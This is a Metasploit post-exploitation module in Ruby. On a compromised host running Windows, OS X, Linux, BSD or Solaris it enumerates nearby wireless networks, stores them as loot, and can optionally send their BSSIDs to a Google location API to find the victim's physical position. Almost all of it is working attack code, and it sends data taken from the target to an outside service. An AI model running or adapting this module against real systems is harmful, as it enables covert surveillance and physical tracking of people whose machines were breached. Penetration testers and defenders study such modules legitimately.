##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'json'
require 'net/http'

class Metasploit3 < Msf::Post

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Multiplatform WLAN Enumeration and Geolocation',
        'Description'   => %q{ Enumerate wireless networks visible to the target device.
        Optionally geolocate the target by gathering local wireless networks and
        performing a lookup against Google APIs.},
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Tom Sellers <tom[at]fadedcode.net>'],
        'Platform'      => %w{ osx win linux bsd solaris },
        'SessionTypes'  => [ 'meterpreter', 'shell' ],
      ))

      register_options(
        [
        OptBool.new('GEOLOCATE', [ false, 'Use Google APIs to geolocate Linux, Windows, and OS X targets.', false])
        ], self.class)

  end

  def get_strength(quality)
    # Convert the signal quality to signal strength (dbm) to be sent to
    # Google.  Docs indicate this should subtract 100 instead of the 95 I
    # am using here, but in practice 95 seems to be closer.
    signal_str = quality.to_i / 2
    signal_str = (signal_str - 95).round
    return signal_str

  end

  def parse_wireless_win(listing)
    wlan_list = ''
    raw_networks = listing.split("\r\n\r\n")

    raw_networks.each { |network|
      details = network.match(/^SSID [\d]+ : ([^\r\n]*).*?BSSID 1[\s]+: ([\h]{2}:[\h]{2}:[\h]{2}:[\h]{2}:[\h]{2}:[\h]{2}).*?Signal[\s]+: ([\d]{1,3})%/m)
        if !details.nil?
          strength = get_strength(details[3])
          network_data = "&wifi=mac:#{details[2].to_s.upcase}|ssid:#{details[1].to_s}|ss=#{strength.to_i}"
          wlan_list << network_data
        end
    }

    return wlan_list
  end


  def parse_wireless_linux(listing)
    wlan_list = ''
    raw_networks = listing.split("Cell ")

    raw_networks.each { |network|
      details = network.match(/^[\d]{1,4} - Address: ([\h]{2}:[\h]{2}:[\h]{2}:[\h]{2}:[\h]{2}:[\h]{2}).*?Signal level=([\d-]{1,3}).*?ESSID:"([^"]*)/m)
        if !details.nil?
          network_data = "&wifi=mac:#{details[1].to_s.upcase}|ssid:#{details[3].to_s}|ss=#{details[2].to_i}"
          wlan_list << network_data
        end
    }

    return wlan_list
  end

  def parse_wireless_osx(listing)
    wlan_list = ''
    raw_networks = listing.split("\n")

    raw_networks.each { |network|
      network = network.strip
      details = network.match(/^(.*(?!\h\h:))[\s]*([\h]{2}:[\h]{2}:[\h]{2}:[\h]{2}:[\h]{2}:[\h]{2})[\s]*([\d-]{1,3})/)
        if !details.nil?
          network_data = "&wifi=mac:#{details[2].to_s.upcase}|ssid:#{details[1].to_s}|ss=#{details[3].to_i}"
          wlan_list << network_data
        end
    }

    return wlan_list
  end

  def perform_geolocation(wlan_list)

    if wlan_list.blank?
      print_error("Unable to enumerate wireless networks from the target.  Wireless may not be present or enabled.")
      return
    end

    # Build and send the request to Google
    url = "https://maps.googleapis.com/maps/api/browserlocation/json?browser=firefox&sensor=true#{wlan_list}"
    uri = URI.parse(URI.encode(url))
    request = Net::HTTP::Get.new(uri.request_uri)
    http = Net::HTTP::new(uri.host,uri.port)
    http.use_ssl = true
    response = http.request(request)

    # Gather the required information from the response
    if response && response.code == '200'
      results = JSON.parse(response.body)
      latitude =  results["location"]["lat"]
      longitude = results["location"]["lng"]
      accuracy = results["accuracy"]
      print_status("Google indicates that the target is within #{accuracy} meters of #{latitude},#{longitude}.")
      print_status("Google Maps URL:  https://maps.google.com/?q=#{latitude},#{longitude}")
    else
      print_error("Failure connecting to Google for location lookup.")
    end

  end


  # Run Method for when run command is issued
  def run
    if session.type =~ /shell/
      # Use the shell platform for selecting the command
      platform = session.platform
    else
      # For Meterpreter use the sysinfo OS since java Meterpreter returns java as platform
      platform = session.sys.config.sysinfo['OS']
    end


    case platform
    when /win/i

      listing = cmd_exec('netsh wlan show networks mode=bssid')
      if listing.nil?
        print_error("Unable to generate wireless listing.")
        return nil
      else
        store_loot("host.windows.wlan.networks", "text/plain", session, listing, "wlan_networks.txt", "Available Wireless LAN Networks")
        # The wireless output does not lend itself to displaying on screen for this platform.
        print_status("Wireless list saved to loot.")
        if datastore['GEOLOCATE']
          wlan_list = parse_wireless_win(listing)
          perform_geolocation(wlan_list)
          return
        end
      end

    when /osx/i

      listing = cmd_exec('/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s')
      if listing.nil?
        print_error("Unable to generate wireless listing.")
        return nil
      else
        store_loot("host.osx.wlan.networks", "text/plain", session, listing, "wlan_networks.txt", "Available Wireless LAN Networks")
        print_status("Target's wireless networks:\n\n#{listing}\n")
        if datastore['GEOLOCATE']
          wlan_list = parse_wireless_osx(listing)
          perform_geolocation(wlan_list)
          return
        end
      end

    when /linux/i

      listing = cmd_exec('iwlist scanning')
      if listing.nil?
        print_error("Unable to generate wireless listing.")
        return nil
      else
        store_loot("host.linux.wlan.networks", "text/plain", session, listing, "wlan_networks.txt", "Available Wireless LAN Networks")
        # The wireless output does not lend itself to displaying on screen for this platform.
        print_status("Wireless list saved to loot.")
        if datastore['GEOLOCATE']
          wlan_list = parse_wireless_linux(listing)
          perform_geolocation(wlan_list)
          return
        end
      end

    when /solaris/i

      listing = cmd_exec('dladm scan-wifi')
      if listing.blank?
        print_error("Unable to generate wireless listing.")
        return nil
      else
        store_loot("host.solaris.wlan.networks", "text/plain", session, listing, "wlan_networks.txt", "Available Wireless LAN Networks")
        print_status("Target's wireless networks:\n\n#{listing}\n")
        print_error("Geolocation is not supported on this platform.\n\n") if datastore['GEOLOCATE']
        return
      end

    when /bsd/i

      interface = cmd_exec("dmesg | grep -i wlan | cut -d ':' -f1 | uniq")
      # Printing interface as this platform requires the interface to be specified
      # it might not be detected correctly.
      print_status("Found wireless interface: #{interface}")
      listing = cmd_exec("ifconfig #{interface} scan")
      if listing.blank?
        print_error("Unable to generate wireless listing.")
        return nil
      else
        store_loot("host.bsd.wlan.networks", "text/plain", session, listing, "wlan_networks.txt", "Available Wireless LAN Networks")
        print_status("Target's wireless networks:\n\n#{listing}\n")
        print_error("Geolocation is not supported on this platform.\n\n") if datastore['GEOLOCATE']
        return
      end

    else
      print_error("The target's platform, #{platform}, is not supported at this time.")
      return nil
    end

    rescue Rex::TimeoutError, Rex::Post::Meterpreter::RequestError
    rescue ::Exception => e
      print_status("The following Error was encountered: #{e.class} #{e}")
    end


end
